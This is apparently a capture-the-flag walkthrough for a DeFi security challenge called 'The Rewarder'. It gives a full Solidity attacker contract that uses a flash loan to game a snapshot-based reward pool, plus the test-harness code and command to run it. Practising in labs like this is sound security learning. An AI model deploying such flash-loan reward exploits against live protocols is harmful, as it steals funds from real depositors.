# The Rewarder

**HINT:** The rewarding contract is based on a single snapshot.

<details>
<summary>Part 1</summary>
<p>

```
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

// The Rewarder Pool and Flash Loaner Pool Interfaces
interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

contract TheRewarderAttacker {
    using SafeMath for uint256;
    using Address for address payable;

    constructor() public {}

    IERC20 liquidityToken;
    IERC20 rewardToken;
    IFlashLoanerPool flashLoanPool;
    ITheRewarderPool rewarderPool;

    function attack(IERC20 _liquidityToken, IERC20 _rewardToken, IFlashLoanerPool _flashLoanPool, ITheRewarderPool _rewarderPool) public {
        // stores all values needed
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
        flashLoanPool = _flashLoanPool;
        rewarderPool = _rewarderPool;

        // Starts off by taking a flash loan out and depositing it back into rewards pool. It instantly receives rewards, while paying back the flash loan
        uint256 flashLoanBalance =
            liquidityToken.balanceOf(address(flashLoanPool));

        liquidityToken.approve(address(rewarderPool), flashLoanBalance);
        flashLoanPool.flashLoan(flashLoanBalance);

        require(rewardToken.balanceOf(address(this)) > 0, "reward balance was 0");
        bool success =
            rewardToken.transfer(
                msg.sender,
                rewardToken.balanceOf(address(this))
            );
        require(success, "reward transfer failed");
    }
    // Deposits rewards and pays back flash loan sender
    function receiveFlashLoan(uint256 amount) external {
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanPool), amount);
    }
}
```

</p>
</details>

<details>
<summary>Part 2</summary>
<p>

Now go to ```the-rewarder.challenge.js``` and at the top of the file add:
```js
const TheRewarderAttacker = contract.fromArtifact("TheRewarderAttacker");
```
And at ```Exploit``` add:
```js
await this.attacker.attack(
    this.liquidityToken.address,
    this.rewardToken.address,
    this.flashLoanPool.address,
    this.rewarderPool.address,
    { from: attacker }
);
```

```sh
npm run the-rewarder.challenge.js
```

</p>
</details>